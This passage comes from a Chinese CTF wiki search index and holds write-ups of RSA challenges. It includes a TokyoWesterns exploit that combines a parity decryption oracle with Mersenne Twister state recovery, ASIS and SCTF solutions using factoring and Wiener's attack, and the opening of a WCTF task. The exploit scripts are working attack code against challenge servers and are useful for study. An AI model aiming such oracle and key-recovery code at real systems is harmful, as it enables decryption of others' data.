io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\nimport subprocess\nimport random\ndef get_iv(io):\n    rsa_c, aes_c=encrypt_io(io,\"1\")\n    return bytes_to_long(aes_c[0:16])\ndef splitInto32(w128):\n    w1 = w128 &amp; (2**32-1)\n    w2 = (w128 &gt;&gt; 32) &amp; (2**32-1)\n    w3 = (w128 &gt;&gt; 64) &amp; (2**32-1)\n    w4 = (w128 &gt;&gt; 96)\n    return w1,w2,w3,w4\ndef sign(iv):\n    # converts a 32 bit uint to a 32 bit signed int\n    if(iv&amp;0x80000000):\n        iv = -0x100000000 + iv\n    return iv\ndef get_state(io):\n    numbers=[]\n    for i in range(156):\n        print i\n        numbers.append(get_iv(io))\n    observedNums = [sign(w) for n in numbers for w in splitInto32(n)]\n    o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums))\n    stateList = [int(s) % (2 ** 32) for s in o.split()]\n    r = random.Random()\n    state = (3, tuple(stateList + [624]), None)\n    r.setstate(state)\n    return r.getrandbits(128)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#exp","title":"EXP","text":"<p>\u6574\u4f53\u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from zio import *\nimport primefac\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\ntarget=(\"crypto.chal.ctf.westerns.tokyo\",5643)\ne=65537\n\ndef get_enc_key(io):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"4\")\n    io.read_until(\"here is encrypted key :)n\")\n    c=int(io.readline()[:-1],16)\n    return c\n\ndef encrypt_io(io,p):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\n\ndef decrypt_io(io,c):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"2\")\n    io.read_until(\"input hexencoded cipher text: \")\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n    io.read_until(\"RSA: \")\n    return io.read_line()[:-1].decode(\"hex\")\n\ndef get_n(io):\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n    n=pow(2,65537)-rsa_c\n    for i in range(3,6):\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n    return n\n\ndef check_n(io,n):\n    rsa_c, aes_c = encrypt_io(io, \"123\")\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n        return True\n    else:\n        return False\n\n\nimport gmpy2\ndef guess_m(io,n,c):\n    k=1\n    lb=0\n    ub=n\n    while ub!=lb:\n        print lb,ub\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n            lb = (lb + ub) / 2\n        else:\n            ub = (lb + ub) / 2\n        k+=1\n    print ub,len(long_to_bytes(ub))\n    return ub\n\n\nio = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),print_write=COLORED(NONE, 'green'))\nn=get_n(io)\nprint check_n(io,n)\nc=get_enc_key(io)\nprint len(decrypt_io(io,c))==16\n\n\nm=guess_m(io,n,c)\nfor i in range(m - 50000,m+50000):\n    if pow(i,e,n)==c:\n        aeskey=i\n        print long_to_bytes(aeskey)[-1]==decrypt_io(io,c)[-1]\n        print \"found aes key\",hex(aeskey)\n\nimport fuck_r\nnext_iv=fuck_r.get_state(io)\nprint \"##########################################\"\nprint next_iv\nprint aeskey\nio.interact()\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag","title":"2016 ASIS Find the flag","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002</p> <pre><code>\u279c  RSA openssl rsa -pubin -in pubkey.pem -text -modulus\nPublic-Key: (256 bit)\nModulus:\n    00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d:\n    f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f:\n    20:61:b9\nExponent: 12405943493775545863 (0xac2ac3e0ca0f5607)\nModulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9\n</code></pre> <p>\u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a N\uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002</p> <pre><code>p = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553\n</code></pre> <p>\u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002</p> <pre><code>#!/usr/bin/python\nimport gmpy\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\n\nflag = open('flag', 'r').read() * 30\n\ndef ext_rsa_encrypt(p, q, e, msg):\n    m = bytes_to_long(msg)\n    while True:\n        n = p * q\n        try:\n            phi = (p - 1)*(q - 1)\n            d = gmpy.invert(e, phi)\n            pubkey = RSA.construct((long(n), long(e)))\n            key = PKCS1_v1_5.new(pubkey)\n            enc = key.encrypt(msg).encode('base64')\n            return enc\n        except:\n            p = gmpy.next_prime(p**2 + q**2)\n            q = gmpy.next_prime(2*p*q)\n            e = gmpy.next_prime(e**2)\n\np = getPrime(128)\nq = getPrime(128)\nn = p*q\ne = getPrime(64)\npubkey = RSA.construct((long(n), long(e)))\nf = open('pubkey.pem', 'w')\nf.write(pubkey.exportKey())\ng = open('flag.enc', 'w')\ng.write(ext_rsa_encrypt(p, q, e, flag))\n</code></pre> <p>\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 p \u548c q\uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 <code>pubkey.pem</code>\uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 <code>ext_rsa_encrypt</code> \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 <code>flag.enc</code>\u3002</p> <p>\u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 p \u548c q\uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002</p> <pre><code>#!/usr/bin/python\nimport gmpy\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\n\ndef ext_rsa_decrypt(p, q, e, msg):\n    m = bytes_to_long(msg)\n    while True:\n        n = p * q\n        try:\n            phi = (p - 1)*(q - 1)\n            d = gmpy.invert(e, phi)\n            privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\n            key = PKCS1_v1_5.new(privatekey)\n            de_error = ''\n            enc = key.decrypt(msg.decode('base64'), de_error)\n            return enc\n        except Exception as error:\n            print error\n            p = gmpy.next_prime(p**2 + q**2)\n            q = gmpy.next_prime(2*p*q)\n            e = gmpy.next_prime(e**2)\n\np = 311155972145869391293781528370734636009\nq = 315274063651866931016337573625089033553\nn = p*q\ne = 12405943493775545863 \n# pubkey = RSA.construct((long(n), long(e)))\n# f = open('pubkey.pem', 'w')\n# f.write(pubkey.exportKey())\ng = open('flag.enc', 'r')\nmsg = g.read()\nflag = ext_rsa_decrypt(p, q, e, msg)\nprint flag\n</code></pre> <p>\u62ff\u5230 flag</p> <pre><code>ASIS{F4ct0R__N_by_it3rat!ng!}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1","title":"SCTF RSA1","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6</p> <pre><code>\u279c  level0 git:(master) \u2717 ls -al\n\u603b\u7528\u91cf 4\ndrwxrwxrwx 1 root root    0 7\u6708  30 16:36 .\ndrwxrwxrwx 1 root root    0 7\u6708  30 16:34 ..\n-rwxrwxrwx 1 root root  349 5\u6708   2  2016 level1.passwd.enc\n-rwxrwxrwx 1 root root 2337 5\u6708   6  2016 level1.zip\n-rwxrwxrwx 1 root root  451 5\u6708   2  2016 public.key\n</code></pre> <p>\u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5</p> <pre><code>\u279c  level0 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus \nPublic-Key: (2048 bit)\nModulus:\n    00:94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:\n    89:d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:\n    70:87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c:\n    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:\n    bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8:\n    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:\n    ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a:\n    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:\n    72:1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5:\n    16:36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac:\n    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:\n    31:56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49:\n    cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69:\n    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:\n    86:94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20:\n    eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46:\n    b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06:\n    68:81\nExponent: 65537 (0x10001)\nModulus=94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ\n1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W\nk5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe\nRRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr\nV/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG\nZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo\ngQIDAQAB\n-----END PUBLIC KEY-----\n</code></pre> <p>\u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230</p> <pre><code>p=250527704258269\nq=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.PublicKey import RSA\nimport gmpy2\nfrom base64 import b64decode\np = 250527704258269\nq = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\ne = 65537\nn = p * q\n\n\ndef getprivatekey(n, e, p, q):\n    phin = (p - 1) * (q - 1)\n    d = gmpy2.invert(e, phin)\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n    with open('private.pem', 'w') as f:\n        f.write(priviatekey.exportKey())\n\n\ndef decrypt():\n    with open('./level1.passwd.enc') as f:\n        cipher = f.read()\n    cipher = b64decode(cipher)\n    with open('./private.pem') as f:\n        key = RSA.importKey(f)\n    print key.decrypt(cipher)\n\n\n#getprivatekey(n, e, p, q)\ndecrypt()\n</code></pre> <p>\u53d1\u73b0\u4e0d\u5bf9</p> <pre><code>\u279c  level0 git:(master) \u2717 python exp.py\n\u4e00\u5806\u4e71\u7801\u3002\u3002\n</code></pre> <p>\u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801</p> <pre><code>def decrypt1():\n    with open('./level1.passwd.enc') as f:\n        cipher = f.read()\ncipher = b64decode(cipher)\nwith open('./private.pem') as f:\n        key = RSA.importKey(f)\nkey = PKCS1_OAEP.new(key)\nprint key.decrypt(cipher)\n</code></pre> <p>\u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230</p> <pre><code>\u279c  level0 git:(master) \u2717 python exp.py\nFaC5ori1ati0n_aTTA3k_p_tOO_sma11\n</code></pre> <p>\u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5</p> <pre><code>\u279c  level1 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: (2048 bit)\nModulus:\n    00:c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c:\n    2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34:\n    c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0:\n    11:11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4:\n    f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e:\n    4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93:\n    45:16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3:\n    3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36:\n    e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c:\n    87:2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da:\n    39:83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc:\n    41:64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0:\n    54:35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18:\n    12:67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb:\n    00:22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e:\n    b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a:\n    12:27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61:\n    3e:7d\nExponent: 65537 (0x10001)\nModulus=C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv\nKp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg\n/duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ\nOaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA\nVgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5\nPbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+\nfQIDAQAB\n-----END PUBLIC KEY-----\n</code></pre> <p>\u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002</p> <pre><code>P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383\n\nP309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002</p> <p>\u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519</p> <p>\u5f97\u5230\u5bc6\u7801 <code>fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS</code>\u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5</p> <pre><code>\u279c  level2 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus\nPublic-Key: (1025 bit)\nModulus:\n    01:ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90:\n    c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85:\n    8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33:\n    f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d:\n    73:e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9:\n    cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32:\n    16:9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63:\n    76:59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d:\n    d5:24:7d:4f:a7:a1:f0:d5:73\nExponent:\n    01:00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7:\n    50:5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd:\n    92:70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf:\n    2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22:\n    28:66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00:\n    6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8:\n    1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc:\n    ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa:\n    68:29:6d:66:7c:cf:57:b9:4b\nModulus=1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN\nEj2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm\nHZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq\nW7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC\n3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7\np2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8\nz1e5Sw==\n-----END PUBLIC KEY-----\n</code></pre> <p>\u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002</p> <pre><code>\u279c  level2 git:(master) \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\nHacked!\n('hacked_d = ', 29897859398360008828023114464512538800655735360280670512160838259524245332403L)\n-------------------------\n</code></pre> <p>\u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\nimport gmpy2\nfrom base64 import b64decode\nd = 29897859398360008828023114464512538800655735360280670512160838259524245332403L\nwith open('./public.key') as f:\n    key = RSA.importKey(f)\n    n = key.n\n    e = key.e\n\n\ndef getprivatekey(n, e, d):\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n    with open('private.pem', 'w') as f:\n        f.write(priviatekey.exportKey())\n\n\ndef decrypt():\n    with open('./level3.passwd.enc') as f:\n        cipher = f.read()\n    with open('./private.pem') as f:\n        key = RSA.importKey(f)\n    print key.decrypt(cipher)\n\n\ngetprivatekey(n, e, d)\ndecrypt()\n</code></pre> <p>\u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 <code>wIe6ER1s_1TtA3k_e_t00_larg3</code> \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-wctf-rsa","title":"2018 WCTF RSA","text":"<p>\u9898\u76ee\u57fa\u672c\u63cf\u8ff0\u4e3a</p> <pre><code>Description:\nEncrypted message for user \"admin\":\n\n&lt;&lt;&lt;320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901&gt;&gt;&gt;\n\nadmin public key:\n\nn = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927\ne = 65537\n\nService: http://36.110.234.253\n</code></pre> <p>\u8fd9\u4e2a\u9898\u76ee\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u5728\u7ebf\u83b7\u53d6 binary \u4e86\uff0c\u73b0\u5728\u5f97\u5230\u7684 binary \u662f\u4e4b\u524d\u5df2\u7ecf\u4e0b\u8f7d\u597d\u7684\uff0c\u6211\u4eec\u5f53\u65f6\u9700\u8981\u767b\u5f55\u7528\u6237\u7684 admin \u6765\u4e0b\u8f7d\u5bf9\u5e94\u7684 generator\u3002</p> <p>\u901a\u8fc7\u7b80\u5355\u9006\u5411\u8fd9\u4e2a generator\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u8fd9\u4e48\u5de5\u4f5c\u7684</p> <ul> <li>\u5229\u7528\u7528\u6237\u7ed9\u5b9a\u7684 license\uff0832 \u4e2a\u5b57\u8282\uff09\uff0c\u8fed\u4ee3\u89e3\u5bc6\u67d0\u4e2a\u56fa\u5b9a\u4f4d\u7f6e\u4e4b\u540e\u7684\u6570\u636e\uff0c\u6bcf 32 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u4e0e\u5bc6\u94a5\u76f8\u5f02\u6216\u5f97\u5230\u7ed3\u679c\u3002</li> <li>\u5bc6\u94a5\u7684\u751f\u6210\u65b9\u6cd5\u4e3a <ul> <li>k_1=key</li> <li>k_2 =sha256(k_1)</li> <li>...</li> <li>k_n=sha256(k_{n-1})</li> </ul> </li> </ul> <p>\u5176\u4e2d\uff0c\u56fa\u5b9a\u4f4d\u7f6e\u5c31\u662f\u5728\u627e\u6e90\u6587\u4ef6 <code>generator</code> \u4e2d\u7b2c\u4e8c\u6b21\u51fa\u73b0 <code>ENCRYPTED</code> 